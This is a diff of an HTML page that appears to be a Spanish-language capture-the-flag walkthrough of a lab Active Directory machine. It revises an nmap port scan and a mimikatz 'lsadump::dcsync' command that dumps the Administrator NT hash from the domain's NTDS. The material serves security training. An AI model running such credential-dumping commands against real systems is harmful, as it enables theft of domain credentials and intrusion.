@@ -145,19 +145,27 @@
 <code><span class="ve">❯ nmap </span><span class="p">10.10.11.168
 Nmap scan report for 10.10.11.168  
 PORT     STATE SERVICE
-53/tcp   open  domain
-80/tcp   open  http
-88/tcp   open  kerberos-sec
-135/tcp  open  msrpc
-139/tcp  open  netbios-ssn
-389/tcp  open  ldap
-445/tcp  open  microsoft-ds
-464/tcp  open  kpasswd5
-593/tcp  open  http-rpc-epmap
-636/tcp  open  ldapssl
-1433/tcp open  ms-sql-s
-3268/tcp open  globalcatLDAP
-3269/tcp open  globalcatLDAPssl</span>
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1433/tcp  open  ms-sql-s
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+4411/tcp  open  found
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49675/tcp open  unknown
+49676/tcp open  unknown
+49688/tcp open  unknown
+49746/tcp open  unknown</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> intentamos obtener el <code class="language-plaintext highlighter-rouge">dominio</code> o información pero parece que hay alguna limitación a nivel de <code class="language-plaintext highlighter-rouge">SMB</code> que no nos devuelve nada interesante</p>
@@ -658,7 +666,7 @@ PS C:\Windows\system32></span>
 
 <p class="plain-text">Solo como extra con <code class="language-plaintext highlighter-rouge">mimikatz</code> haremos un <code class="language-plaintext highlighter-rouge">dcsync</code> para dumpear los hashes del <code class="language-plaintext highlighter-rouge">ntds</code>, en este caso simplemente nos interesa el <code class="language-plaintext highlighter-rouge">NT</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\ProgramData> </span><span class="am">.\mimikatz.exe </span><span class="az">"lsadump::dcsync /domain:scrm.local /user:Administrator" </span><span class="p">exit
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\mimikatz.exe </span><span class="az">'lsadump::dcsync /domain:scrm.local /user:Administrator' </span><span class="p">exit
 
   .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
